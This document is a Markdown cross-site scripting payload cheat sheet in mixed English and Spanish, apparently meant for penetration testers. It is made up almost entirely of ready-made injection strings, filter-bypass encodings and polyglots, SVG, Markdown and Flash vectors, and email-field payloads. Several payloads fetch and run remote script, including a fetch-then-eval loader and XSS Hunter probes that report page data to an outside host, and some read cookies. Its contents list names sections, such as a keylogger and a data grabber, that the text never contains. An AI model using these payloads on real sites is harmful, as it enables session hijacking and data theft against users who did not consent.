# Cross Site Scripting

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

## Tools 

Most tools are also suitable for blind XSS attacks:

* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## Summary

- [XSS in HTML/Applications](#xss-in-htmlapplications)
  - [Good Payloads](#good-payloads)
  - [Best Payloads](#best-payloads)
  - [XSS using a remote JS](#xss-using-a-remote-js)
  - [XSS in hidden input](#xss-in-hidden-input)
  - [DOM based XSS](#dom-based-xss)
- [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
- [XSS in PostMessage](#xss-in-postmessage)
- [XSS in Email](#xss-in-email)
- [Blind XSS](#blind-xss)
  - [XSS Hunter](#xss-hunter)
  - [Blind XSS endpoint](#blind-xss-endpoint)
- [Mutated XSS](#mutated-xss)
- [Polyglot XSS](#polyglot-xss)
- [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
  - [Bypass case sensitive](#bypass-case-sensitive)
  - [Bypass tag blacklist](#bypass-tag-blacklist)
  - [Bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
  - [Bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
  - [Bypass quotes for string](#bypass-quotes-for-string)
  - [Bypass quotes in script tag](#bypass-quotes-in-script-tag)
  - [Bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
  - [Bypass dot filter](#bypass-dot-filter)
  - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
  - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
  - [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
  - [Bypass space filter](#bypass-space-filter)
  - [Bypass email filter](#bypass-email-filter)
  - [Bypass document blacklist](#bypass-document-blacklist)
  - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
  - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
  - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
  - [Bypass ">" using nothing](#bypass--using-nothing)
  - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
  - [Bypass ";" using another character](#bypass--using-another-character)
  - [Bypass using HTML encoding](#bypass-using-html-encoding)
  - [Bypass using Katana](#bypass-using-katana)
  - [Bypass using Cuneiform](#bypass-using-cuneiform)
  - [Bypass using Lontara](#bypass-using-lontara)
  - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
  - [Bypass using Octal encoding](#bypass-using-octal-encoding)
  - [Bypass using Unicode](#bypass-using-unicode)
  - [Bypass using UTF-7](#bypass-using-utf-7)
  - [Bypass using UTF-8](#bypass-using-utf-8)
  - [Bypass using UTF-16be](#bypass-using-utf-16be)
  - [Bypass using UTF-32](#bypass-using-utf-32)
  - [Bypass using BOM](#bypass-using-bom)
  - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
  - [Bypass using jsfuck](#bypass-using-jsfuck)
- [CSP Bypass](#csp-bypass)
- [Common WAF Bypass](#common-waf-bypass)
- [Exploit XSS](#exploit-xss)
  - [Data grabber for XSS](#data-grabber-for-xss)
  - [Javascript keylogger](#javascript-keylogger)

## XSS in HTML/Applications

### Good Payloads
```
--- <p> ---

cgonzalo"><p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

--- <script> ---

cgonzalo"><scr<script>ipt>alert('XSS')</scr<script>ipt>

cgonzalo"><script>alert(String.fromCharCode(88,83,83))</script>

cgonzalo"><!<script>alert(1)</script>

cgonzalo"><script/x>alert(1)</script>

cgonzalo"><script/src=//Ǌ.₨></script>

-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

cgonzalo"><\/script><script>alert('XSS')<\/script>

--- <img> ---

cgonzalo"><img/src=x onerror=confirm(8)>

cgonzalo"><img src="x/><script>alert(8)</script>">

cgonzalo"><img src=x onerror=alert('XSS')//

cgonzalo"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

cgonzalo"><img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

cgonzalo"><img src=x:alert(alt) onerror=eval(src) alt=xss>

cgonzalo"><img src=x "accesskey="x" onclick="confirm(document/*00000*/./*00000*/cookie)"//BBBBBBBBBB=1>

cgonzalo"><--`<img/src=`%20onerror=confirm``>%20--!>

--- <svg> ---

cgonzalo"><svgonload=alert(1)>

cgonzalo"><sVg/onload=confirm(8)>

cgonzalo"><sVg/onload=confirm(8)//

cgonzalo"><svg/onload=alert(String.fromCharCode(88,83,83))>

cgonzalo"><svg id=alert(1) onload=eval(id)>

cgonzalo"><svg><script href=data:,alert(1) /> (Firefox is the only browser which allows self closing script)

cgonzalo"><svg><animate onbegin=alert(1) attributeName=x dur=1s>

cgonzalo"><svg/onload=import(/\\Ǌ.₨/)>

cgonzalo"><svg/onload=alert%26%230000000040"1">

cgonzalo"><svg </onload ="1> (_=alert,_(1337)) "">

cgonzalo"><svg onload=prompt%26%230000000040document.domain)>

cgonzalo"><svg onload=prompt%26%23x000000028;document.domain)>

--- <div> ---

cgonzalo"><</div>script</div>>prompt(8)<</div>/script</div>>

cgonzalo"><div onpointerover="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointerdown="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointerenter="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointerleave="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointermove="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointerout="alert(45)">MOVE HERE</div>

cgonzalo"><div onpointerup="alert(45)">MOVE HERE</div>

cgonzalo"><div><embed src=# onload=confirm(8)></div>

--- <abbr> ---

cgonzalo"><abbr onmouseleave=alert(9)>test_gc</abbr>

--- <iframe> ---

cgonzalo"><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

\u0022><iframe\u002Fsrc\u003D\u0022data:text\u002Fhtml;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg\u003D\u003D\u0022>

\u0022><iframe/src="https://www.example.com/" style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(8)">

cgonzalo"><iframe src="https://isecauditors.com/,javascript:alert(1)//">

cgonzalo"><iframe/onload=write(8)>

cgonzalo"><iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">

cgonzalo"><iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

cgonzalo"><iframe/srcdoc="<script/src=//Ǌ.₨></script>">

cgonzalo'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

--- <video> ---

cgonzalo"><video src=_ onloadstart="alert(1)">

cgonzalo"><video/poster/onerror=alert(1)>

cgonzalo"><video><source onerror="javascript:alert(1)">

cgonzalo"><video controls onloadstart="alert(8)"><source src=x></video>

cgonzalo"><video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>

cgonzalo"><video width="320" height="240" controls><source src=”https://www.mini.es/” type=video/ogg><svg/onload=confirm(8)><source src="/build/videos/arcnet.io(7-sec).mp4" type=video/mp4></video>

cgonzalo"><video controls onloadstart=prompt(8)> <source media="" type="" src="https://miclaro.claro.com.ar/test.mp4" type="video/mp4"> </video>

cgonzalo"><video width="320" height="240" controls oncanplay=alert(8)><source src=”https://applicationvulnerable.com/><source src="/path/in/application/vulnerable.mp4" type=video/mp4></video> (Cuando se consigue un vídeo en la misma aplicación, intentar este payload modificando el atributo "src"

--- <style> ---

cgonzalo"><style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

cgonzalo"><style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>

cgonzalo"><style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>

cgonzalo"><style/onload=write(8)>

cgonzalo"><style/onload=import(/\\Ǌ.₨/)>

--- <a> ---

cgonzalo"><a/href="javascript:alert(1)">

cgonzalo"><a\x09href="javascript:alert(8)">

cgonzalo"><a href\x20="javascript:alert(1)">

cgonzalo"><a href="&Tab;javascript:alert(1)">

cgonzalo"><a href="&#x001;javascript:alert(1)">

cgonzalo"><a href="javas&Tab;cript:alert(1)">

cgonzalo"><a href="javascript:~alert(1)">

cgonzalo"><a href="javascript://%0d%0aalert(1)">

cgonzalo"><a href="javascript:\x0calert(1)">

cgonzalo"><a href="javascript:%ef%bb%bfalert(1)">

cgonzalo"><a href="javascript:&#xfeff;alert(1)">

cgonzalo"><a href=ja&NewLine;vascript:alert(1)>

cgonzalo"><a href=javascript:alert&lpar;&rpar;>

cgonzalo"><a href=javascript:x='%27-alert(1)-%27';>

cgonzalo"><a href=javascript:%61%6c%65%72%74%28%29>

cgonzalo"><a href=javascript:a\u006Cert``>

cgonzalo"><a href=javascript:\u0061\u006C\u0065\u0072\u0074``>

--- <input> ---

cgonzalo"><input autofocus onfocus=alert(1)>

cgonzalo"><input/onauxclick="[1].map(prompt)">

cgonzalo"><input type="text" onblur=alert(8)>

cgonzalo"><input type="color" onblur=alert(8)>

cgonzalo"><input type="color" onblur=alert(8)//

cgonzalo"><input type="text" oncopy=alert(8) value="Try to copy this text"> (Copiar el texto para ejecutar JS)

cgonzalo"><input type="text" name="txt" value="Insert your name" onchange=alert(8)>

cgonzalo"><input type="month" onchange=alert(8)>

cgonzalo"><input type="datetime-local" /onchange=alert(8)//

cgonzalo"><input type="datetime-local" /onchange=alert(8)>

--- <select> ---

cgonzalo"><select autofocus onfocus=alert(1)>

cgonzalo"><select type="color" onblur=alert(8)%22 </select>

cgonzalo"><select type="color" onblur=alert(8)//

--- <textarea> ---

cgonzalo"><textarea autofocus onfocus=alert(1)>

--- <keygen> ---

cgonzalo"><keygen autofocus onfocus=alert(1)>

--- <details> ---

cgonzalo"><details/open/ontoggle="alert`1`">

cgonzalo"><details/open/ontoggle=window.alert`xss`>

--- <audio> ---

cgonzalo"><audio src onloadstart=alert(1)>

cgonzalo"><audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

--- <marquee> ---

cgonzalo"><marquee onstart=alert(1)>

--- <meter> ---

cgonzalo"><meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

--- <button> ---

cgonzalo"><button onfocus=alert(document.domain) '</</</</</</</</autofocus>Click Me!</button>

--- <object> ---

cgonzalo"><object data="https://www.youtube.com/embed/P5asvR0h3OQ?autoplay=1" onmouseout=alert(document.domain)></object>

--- <body> ---

cgonzalo"><body onload=alert(/XSS/.source)>

cgonzalo"><body onafterprint=alert(1)>

'"--><Body onbeforescriptexecute="[1].map(confirm)">

cgonzalo"><body onbeforeprint=alert(8)> (Presionar CTRL + P)

cgonzalo"><body ontouchstart=alert(1)>  (Se activa cuando un dedo toca la pantalla)

cgonzalo"><body ontouchend=alert(1)>   (Se activa cuando se quita un dedo de la pantalla táctil)

cgonzalo"><body ontouchmove=alert(1)>  (Cuando se arrastra un dedo por la pantalla)

cgonzalo"><style/onload=import(/\\Ǌ.₨/)>

cgonzalo"><iframe/onload=import(/\\Ǌ.₨/)>

cgonzalo"><iframe/src="data:text/html,<svg onload=alert(1)>">

cgonzalo"><input type=image src onerror="prompt(1)">

cgonzalo"><img src="/" =_=" title="onerror='prompt(1)'">

cgonzalo"><script x> alert(1) </script 1=2

cgonzalo"><script x>alert('XSS')<script y>

cgonzalo"><script>$=1,alert($)</script>

cgonzalo"><script>$=1,\u0061lert($)</script>

cgonzalo"><</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>

cgonzalo"></style></scRipt><scRipt>alert(1)</scRipt>

cgonzalo"><img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>

cgonzalo"><svg><x><script>alert('1'&#41</x>

cgonzalo"><iframe src=""/srcdoc='<svg onload=alert(1)>'>

cgonzalo"><img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>

cgonzalo"><img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"

cgonzalo"><svg><animate onbegin=alert() attributeName=x></svg>

cgonzalo"><object data="data:text/html,<script>alert(5)</script>">

cgonzalo"><iframe srcdoc="<svg onload=alert(4);>">

cgonzalo"><object data=javascript:alert(3)>

cgonzalo"><iframe src=javascript:alert(2)>

cgonzalo"><embed src=javascript:alert(1)>

cgonzalo"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>

cgonzalo"><embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>

cgonzalo"><a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```

### Best Payloads

```
cgonzalo"><a href=ja&#x0000A;va&#x73;cript&colon;al&#x65;rt``>

cgonzalo"><a href="https://bing.com/" title="title">xss <img onerror=alert(1) src=x></a>

cgonzalo"><a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>

cgonzalo"><svg/onload=write('\74img/src/o\156error\75alert\501\51\76')>

cgonzalo"><iframe/onload=import(/\\Ǌ.₨/)>

cgonzalo"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f

cgonzalo"><input onfocus=alert(document.domain) </autofocus>

cgonzalo"><embed src=# onload=confirm(8)>

cgonzalo"><input type="datetime-local"</onchange=alert(8)//

cgonzalo"><img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />

cgonzalo"><x/ onpointerRawupdatE=+alert&#40;document.domain&#41;>Tocuch me!

cgonzalo"><img src='1' onerror='alert(0)' <

cgonzalo"><svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//

cgonzalo"><img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

cgonzalo"><script ~~~>confirm(1)</script ~~~>

cgonzalo"><</script/script><script ~~~>\u0061lert(1)</script ~~~>

cgonzalo"><img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />

cgonzalo"><img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />

cgonzalo"><object data="data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e"></object>
```
	
### XSS using a remote JS

```
cgonzalo"><svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
	
cgonzalo"><script src=14.rs>
```

### XSS in hidden input

```
cgonzalo"><input type="hidden" accesskey="x" onclick="alert(1)"> (Use CTRL+SHIFT+X to trigger the onclick event)
```

### DOM based XSS

Based on a DOM XSS sink.

```
#"><img src=/ onerror=alert(2)>
```

## XSS in wrappers javascript and data URI

Space substitutions inside JS code:

```
<TAB>
/**/
```

XSS with javascript:

```
-(confirm)(document.domain)//

; alert(1);//

javascript://%0a%0dalert(document.cookie)

javaxscript:alert(1)

javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)

\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)

\152\141\166\141\163\143\162\151\160\164\072alert(1)

java%0ascript:alert(1)

java%09script:alert(1)

java%0dscript:alert(1)

\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

javascript://%0Aalert(1)

javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

XSS with data:

```
data:text/html,<script>alert(0)</script>

data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

XSS with vbscript (only IE)

```
vbscript:msgbox("XSS")
```

## XSS in files

**NOTA:** La sección XML CDATA se utiliza aquí para que el payload de JavaScript no se trate como marcado XML. 

Ejemplo:

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS in SVG

#### 1° Method (svg inside of png)

Rename the file name from:

“fileupload.svg” to “fileupload.svg.png”:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

#### 2° Method (svg)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("1");
   </script>
</svg>
```

#### 3° Method (svg)

```xml
<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="confirm(8)" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
</svg>
```

### XSS in SVG (short)

Cree una imagen "svg" que contenga cada uno de los siguientes payloads:

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```
```javascript
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```
```javascript
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
```
```javascript
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### XSS in Markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
[clickme](javascript:alert`1`)
```

### XSS in SWF flash application

Necesitará un swf XSS. Ese archivo "xss.swf" se puede obtener en el directorio "Files PoC" dentro de "XSS Injection".

Cárguelo en el servidor que está probando.

Una vez que vea se carga el fichero en el servidor y no le pide "descargar" o que se "refleje" en el servidor, es cuando se almacena el código XSS.

Simplemente agregue:

`?js=alert(document.domain);` al final de su ".swf" y debería mostrar el XSS.

```powershell
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);

IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}

IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```

### XSS in SWF flash application

```
flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
```

### XSS in CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## XSS in PostMessage

Si el origen de destino es un asterisco *, el mensaje se puede enviar a cualquier dominio que tenga referencia a la página secundaria.

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## XSS in Email

```
testacc@gmail.com‘-alert(9)-’

testacc@gmail.com'-alert(9)-'

test+(<script>alert(0)</script>)@gmail.com

test@gmail(<script>alert(0)</script>).com

"<script>alert(0)</script>"@gmail.com

“<script src=x onerror=confirm(8)>”@gmail.com
```

## Blind XSS

### XSS Hunter

Available at [https://xsshunter.com/app](https://xsshunter.com/app)

XSS Hunter le permite encontrar todo tipo de vulnerabilidades de secuencias de comandos entre sitios, incluido el XSS ciego que a menudo se pasa por alto. El servicio funciona alojando sondas XSS especializadas que, al dispararse, escanean la página y envían información sobre la página vulnerable al servicio XSS Hunter.

```javascript
"><script src=//yoursubdomain.xss.ht></script>
```
```javascript
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')
```
```javascript
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>
```
```javascript
<script>$.getScript("//yoursubdomain.xss.ht")</script>
```

### Blind XSS endpoint

- Contact forms
- Ticket support
- Referer Header
  - Custom Site Analytics
  - Administrative Panel logs
- User Agent
  - Custom Site Analytics
  - Administrative Panel logs
- Comment Box
  - Administrative Panel

## Mutated XSS

Úselo cuando la entrada aterrice dentro o entre la apertura/cierre de las siguientes etiquetas:

```javascript
<title>, <style>, <script>, <textarea>, <noscript>, <pre>, <xmp>, <iframe>, <tag>
```

```
</tag><svg onload=alert(1)>

"></tag><svg onload=alert(1)>

</noscript><svg onload=alert(1)>

"></noscript><svg onload=alert(1)>
	
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Polyglot XSS

Polyglot XSS

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
```
">><marquee><img src=x onerror=confirm(1)></marquee>" >
```
```
</plaintext\></|\><plaintext/onmouseover=prompt(1) >
```
```
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script>
```
```
<script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```
```
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'>
```
```
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```
```
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```
```
'">><marquee><img src=x onerror=confirm(1)></marquee>">
```
```
</plaintext\></|\><plaintext/onmouseover=prompt(1)>
```
```
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
```
```
<script>alert(1)</script>">
```
```
<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">
```
```
<img src="http://i.imgur.com/P8mL8.jpg">
```
```
javascript://'/</title></style></textarea></script>--><p" 
onclick=alert()//>*/alert()/*
```
```
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
```
```
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
```
```
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
```
```
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
```
```
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
```
```
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
```
```
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
```
```
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
```
```
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
```
```
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```
```
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```
```
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```
```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```
```
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
```
```
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```
```
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

## Source Injection

Úselo cuando la entrada aterrice como un valor de los siguientes atributos de etiqueta HTML: 

```
"href", "src", "data", "action" o "<form action=>""
```

El atributo "src" en las etiquetas de "script" puede ser:

```
src=URL

src="data:,alert(1)"

src=javascript:alert(1)

src='javascript:alert(1)'

src=‘javascript:alert(1)‘

src=’javascript:alert(1)’

src=‘javascript:alert(1)’
```

## Script Injection

Úselo cuando la entrada aterrice en un bloque "script", dentro de un valor delimitado por cadena:

```
'-alert(1)-'

'/alert(1)//

‘-alert(1)-’

‘/alert(1)//

\'/alert(1)//

</script><svg onload=alert(1)>

></script><svg onload=alert(1)>

"></script><svg onload=alert(1)>

'}alert(1);{'

'}alert(1)%0A{'

\'}alert(1);{//

/alert(1)//\

/alert(1)}//\
```


## File Upload Injection

Úselo cuando el nombre del archivo cargado se refleje en algún lugar de la página de destino:

```
"><svg onload=alert(1)>.gif
```

Úselo cuando los metadatos del archivo cargado se reflejen en algún lugar de la página de destino. 
Utiliza 'exiftool' de línea de comandos y se puede configurar cualquier campo de metadatos:

```
exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```

Úselo para crear un XSS almacenado en el target al cargar archivos de imagen. Guarde el contenido a continuación como "xss.svg":

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

## PHP Self URL Injection

Úselo cuando el código PHP subyacente del destino utilice la URL actual como un valor de atributo de un formulario HTML.
Por ejemplo, inyecte entre la extensión php y el inicio de la parte de la consulta (?) usando una barra inclinada (/):

```
https://vulnerable.com/xss.php/"><svg onload=alert(1)>?a=reader
```

## XSS in HTTP Header Cached

Úselo para almacenar un vector XSS en la aplicación utilizando el esquema de caché MISS-MISS-HIT (si existe uno).

Reemplace \<XSS> con su vector respectivo y TARGET con una cadena ficticia para evitar la versión en caché real de la página. Realiza la misma solicitud 3 veces:

```
curl -i http://example.com/test123.php
```

Si se observa algún header del tipo "header-especial: HIT", se debe agregar algo en la URL para evitar la caché, ya que el valor de "HIT" implica que está llegando al WAF:

```
curl -i http://example.com/test123.php?cgonzalo
```

Ahora se observa el valor de "header-especial: MISS", lo cual indica que esta URL es una versión no almacenada en caché de la página.

Luego, inyectar nuestro propio encabezado (con la flag -H) para verificar si aparece como respuesta:

```
curl -iH "Test: myValue" http://example.com/test123.php?cgonzalo
```

